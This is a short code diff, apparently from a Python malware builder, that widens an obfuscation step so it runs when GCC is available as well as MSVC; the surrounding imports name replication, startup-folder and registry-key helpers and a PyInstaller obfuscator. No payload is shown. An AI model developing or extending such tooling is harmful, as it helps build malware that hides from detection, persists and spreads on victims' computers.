@@ -8,7 +8,7 @@ from random import randrange,choice
 from Utils.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
     download_file, extract_zip, get_current_file_path, base64_encode_file, \
     find_python_path, ctypes_update_system,\
-    is_admin,startupFolder,tempFolder,BaseTempFolder,set_env_variable,setRegistryKey,TypicalRegistryKey
+    is_admin,startupFolder,tempFolder,BaseTempFolder,set_env_variable,setRegistryKey,TypicalRegistryKey, is_gcc_in_path
 from Replication.main import replicate
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
 
@@ -267,7 +267,7 @@ def get_pyinstaller(pythonPath: str) -> bool:
         # assume pyinstaller extracted in the PATH
         print("[*] Unknown error in extracting and downloading pyinstaller")
         return False
-    if is_msvc_exist():
+    if is_msvc_exist() or is_gcc_in_path():
         if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
             return True
         return False
